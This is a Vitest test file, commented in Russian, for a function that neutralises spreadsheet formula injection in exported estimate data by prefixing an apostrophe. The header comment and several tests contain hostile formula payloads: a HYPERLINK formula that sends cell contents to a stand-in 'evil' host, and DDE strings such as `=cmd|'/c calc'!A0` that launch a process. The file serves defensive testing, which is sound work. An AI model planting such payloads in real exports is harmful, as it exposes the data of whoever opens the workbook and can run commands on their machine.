/**
 * Тесты написаны до реализации. Экранирование формульных инъекций — роадмап M4:
 * «Четыре выгрузки §10 (ADR-R-006), ЭКРАНИРОВАНИЕ ФОРМУЛЬНЫХ ИНЪЕКЦИЙ».
 *
 * ОТКУДА БЕРЁТСЯ УГРОЗА
 *
 * В выгрузку попадают наименования позиций, взятые ИЗ ДОКУМЕНТОВ ЗАКАЗЧИКА И
 * ПОДРЯДЧИКОВ. Текст, начинающийся с `=`, `+`, `-` или `@`, Excel и LibreOffice
 * считают формулой и вычисляют при открытии файла. Наименование
 * `=HYPERLINK("http://…"&A1)` уводит содержимое соседней ячейки на чужой сервер
 * при простом открытии книги, а `=cmd|'/c calc'!A0` в некоторых конфигурациях
 * запускает процесс.
 *
 * Ключевое здесь то, что жертва — не мы. Книгу открывает ЗАКАЗЧИК, у которого
 * рядом лежат его собственные данные. Мы всего лишь передали ему текст, который
 * сами не проверили.
 *
 * ПОЧЕМУ НЕЛЬЗЯ ПРОСТО ВЫРЕЗАТЬ ОПАСНЫЙ СИМВОЛ
 *
 * Потому что наименование позиции обязано дойти до человека БЕЗ ИЗМЕНЕНИЙ:
 * по нему сверяют смету с документом. «-40°C» и «40°C» — разные требования, и
 * молчаливое отбрасывание минуса испортит сверку тише, чем инъекция.
 *
 * Поэтому текст не режется, а обезвреживается: ведущий апостроф заставляет
 * табличный процессор трактовать содержимое как текст, и в ячейке видно ровно
 * то, что было в источнике.
 */
import { describe, expect, it } from "vitest";

import { escapeFormulaInjection } from "./formula-injection.js";

describe("экранирование формульных инъекций", () => {
  it("обезвреживает текст, начинающийся со знака равенства", () => {
    expect(escapeFormulaInjection('=HYPERLINK("http://зло","жми")')).toBe(
      '\'=HYPERLINK("http://зло","жми")',
    );
  });

  it("обезвреживает плюс, минус и коммерческое at", () => {
    for (const начало of ["+", "-", "@"]) {
      expect(escapeFormulaInjection(`${начало}СУММ(A1)`)).toBe(`'${начало}СУММ(A1)`);
    }
  });

  it("обезвреживает пробельный шум перед знаком формулы", () => {
    // Табуляция и перевод каретки не мешают Excel считать дальнейшее формулой.
    expect(escapeFormulaInjection("\t=1+1")).toBe("'\t=1+1");
    expect(escapeFormulaInjection("\r=1+1")).toBe("'\r=1+1");

    // Ведущий пробел Excel считает признаком текста — но импортёры CSV и
    // загрузчики 1С пробелы ОБРЕЗАЮТ, и строка снова становится формулой уже
    // на чужой стороне. Безопасность на границе форматов, а не в одном из них.
    expect(escapeFormulaInjection(" =1+1")).toBe("' =1+1");
  });

  it("НЕ трогает текст с ведущей табуляцией без признака формулы", () => {
    // Наименование позиции, начинающееся с табуляции, инъекцией не является.
    // Вешать на него апостроф — менять текст источника без причины, а текст
    // обязан дойти до человека таким, каким был в документе.
    expect(escapeFormulaInjection("\tБлок управления")).toBe("\tБлок управления");
  });

  it("НЕ трогает обычное наименование позиции", () => {
    const имя = "Кабель ВВГнг(А)-LS 5х16 мм²";

    expect(escapeFormulaInjection(имя)).toBe(имя);
  });

  it("НЕ вырезает опасный символ, а обезвреживает строку целиком", () => {
    // Наименование обязано дойти до человека без изменений: по нему сверяют
    // смету с документом. Отброшенный минус испортит сверку тише, чем инъекция.
    const имя = "-40°C, исполнение УХЛ1";

    expect(escapeFormulaInjection(имя)).toBe(`'${имя}`);
    expect(escapeFormulaInjection(имя).slice(1)).toBe(имя);
  });

  it("не добавляет второй апостроф уже обезвреженной строке", () => {
    expect(escapeFormulaInjection("'=1+1")).toBe("'=1+1");
  });

  it("оставляет пустую строку пустой", () => {
    expect(escapeFormulaInjection("")).toBe("");
  });

  it("не считает формулой отрицательное число", () => {
    // Число записывается в ячейку числом, а не текстом, и апостроф превратил бы
    // его в текст: суммы по столбцу перестали бы считаться.
    expect(escapeFormulaInjection("-1234.56", { numeric: true })).toBe("-1234.56");
  });

  it("обезвреживает текст, лишь похожий на число", () => {
    // `-1+cmd` числом не является, и пропускать его как число нельзя.
    expect(escapeFormulaInjection("-1+cmd|'/c calc'!A0", { numeric: true })).toBe(
      "'-1+cmd|'/c calc'!A0",
    );
  });
});
